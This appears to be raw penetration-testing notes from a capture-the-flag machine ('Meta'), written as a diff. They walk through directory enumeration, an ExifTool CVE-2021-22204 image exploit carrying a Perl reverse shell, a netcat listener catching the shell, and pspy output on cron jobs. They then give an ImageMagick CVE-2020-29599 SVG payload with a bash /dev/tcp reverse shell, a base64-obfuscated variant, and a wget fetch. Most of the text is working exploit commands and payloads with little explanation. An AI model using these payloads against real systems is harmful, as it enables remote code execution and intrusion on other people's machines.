@@ -1,0 +1,150 @@
+└─$ sudo dirsearch -u http://dev01.artcorp.htb/metaview/
+
+[05:13:32] Starting: metaview/
+[05:13:38] 403 -  199B  - /metaview/.ht_wsr.txt
+[05:13:38] 403 -  199B  - /metaview/.htaccessOLD2
+[05:13:38] 403 -  199B  - /metaview/.htaccess.orig
+[05:13:38] 403 -  199B  - /metaview/.htaccess.bak1
+[05:13:38] 403 -  199B  - /metaview/.htaccessBAK
+[05:13:38] 403 -  199B  - /metaview/.htaccessOLD
+[05:13:38] 403 -  199B  - /metaview/.htaccess_sc
+[05:13:38] 403 -  199B  - /metaview/.htaccess_extra
+[05:13:38] 403 -  199B  - /metaview/.htaccess.save
+[05:13:38] 403 -  199B  - /metaview/.htaccess_orig
+[05:13:38] 403 -  199B  - /metaview/.htaccess.sample
+[05:13:38] 403 -  199B  - /metaview/.htm
+[05:13:38] 403 -  199B  - /metaview/.html
+[05:13:38] 403 -  199B  - /metaview/.htpasswd_test
+[05:13:38] 403 -  199B  - /metaview/.htpasswds
+[05:13:38] 403 -  199B  - /metaview/.httr-oauth
+[05:13:40] 403 -  199B  - /metaview/.php
+[05:13:58] 301 -  249B  - /metaview/assets  ->  http://dev01.artcorp.htb/metaview/assets/
+[05:14:04] 200 -   72B  - /metaview/composer.json
+[05:14:07] 301 -  246B  - /metaview/css  ->  http://dev01.artcorp.htb/metaview/css/
+[05:14:22] 301 -  246B  - /metaview/lib  ->  http://dev01.artcorp.htb/metaview/lib/
+[05:14:50] 301 -  250B  - /metaview/uploads  ->  http://dev01.artcorp.htb/metaview/uploads/
+[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_files.php
+[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_psr4.php
+[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_classmap.php
+[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_static.php
+[05:14:51] 200 -    3KB - /metaview/vendor/composer/LICENSE
+[05:14:51] 200 -    0B  - /metaview/vendor/autoload.php
+[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_namespaces.php
+[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_real.php
+[05:14:51] 200 -    0B  - /metaview/vendor/composer/ClassLoader.php
+
+└─$ curl http://dev01.artcorp.htb/metaview/composer.json
+{
+    "autoload": {
+        "files": ["lib/ExifToolWrapper.php"]
+    }
+}    
+
+http://dev01.artcorp.htb/metaview/index.php  
+this page is for uploading and showing the metadata of an images file use uploaded
+> https://www.exploit-db.com/exploits/50911
+
+use this poc to crate a pic file for uploading to get a reverse shell.
+└─$ python3 50911.py  -s 10.10.16.9 8821
+
+        _ __,~~~/_        __  ___  _______________  ___  ___
+    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
+        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
+_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
+    
+RUNNING: UNICORD Exploit for CVE-2021-22204
+PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(8821,inet_aton('10.10.16.9')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
+RUNTIME: DONE - Exploit image written to 'image.jpg'
+
+
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.140] 51342
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+ python3 -c "import pty;pty.spawn('/bin/bash')"
+
+ ══╣ Possible private SSH keys were found!
+/etc/ImageMagick-6/mime.xml
+
+
+
+pspy64
+
+2026/01/07 09:12:01 CMD: UID=0     PID=18824  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=0     PID=18823  | /usr/sbin/cron -f 
+2026/01/07 09:12:01 CMD: UID=0     PID=18822  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=0     PID=18821  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=0     PID=18820  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=0     PID=18825  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=0     PID=18826  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=0     PID=18827  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=1000  PID=18828  | /bin/bash /usr/local/bin/convert_images.sh 
+2026/01/07 09:12:01 CMD: UID=0     PID=18829  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=1000  PID=18830  | /bin/bash /usr/local/bin/convert_images.sh 
+2026/01/07 09:12:01 CMD: UID=0     PID=18831  | /usr/sbin/CRON -f 
+2026/01/07 09:12:01 CMD: UID=0     PID=18833  | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 
+2026/01/07 09:12:01 CMD: UID=0     PID=18832  | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* 
+2026/01/07 09:12:01 CMD: UID=1000  PID=18834  | 
+2026/01/07 09:12:01 CMD: UID=0     PID=18835  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
+2026/01/07 09:12:01 CMD: UID=0     PID=18836  | /bin/sh -c rm /tmp/* 
+
+
+thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
+
+ls -l /usr/local/bin/convert_images.sh
+
+<tb/metaview$ ls -l /usr/local/bin/convert_images.sh
+-rwxr-xr-x 1 root root 126 Jan  3  2022 /usr/local/bin/convert_images.sh
+
+www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /usr/local/bin/convert_images.sh
+<.htb/metaview$ cat /usr/local/bin/convert_images.sh
+#!/bin/bash
+cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
+pkill mogrify
+
+which mogrify
+/usr/local/bin/mogrify
+www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -la /usr/local/bin/mogrify
+<p.htb/convert_images$ ls -la /usr/local/bin/mogrify     
+lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -> magick
+
+www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ /usr/local/bin/mogrify --version         
+<tb/convert_images$ /usr/local/bin/mogrify --version     
+Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
+Copyright: © 1999-2020 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5) 
+Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
+
+https://github.com/lnwza0x0a/CVE-2020-29599/blob/main/exploit.svg?short_path=16f828c
+
+<image authenticate='ff" `echo "bash -c 'bash -i &>/dev/tcp/10.10.16.9/9999 0>&1 '" `;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="msl:exploit.svg" height="100" width="100"/>
+  </svg>
+</image>
+EOF
+
+<image authenticate='ff" `echo "IGJhc2ggLWkgJj4gL2Rldi90Y3AvMTAuMTAuMTYuOS80NDQgMD4mMSAK" | base64 -d | bash`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1>
+  <image xlink:href="msl:exploit.svg" height="100" width="100"/>
+  </svg>
+</image>
+
+
+wget http://10.10.16.9:/r.svg
+
+
+/usr/local/bin/mogrify -format png
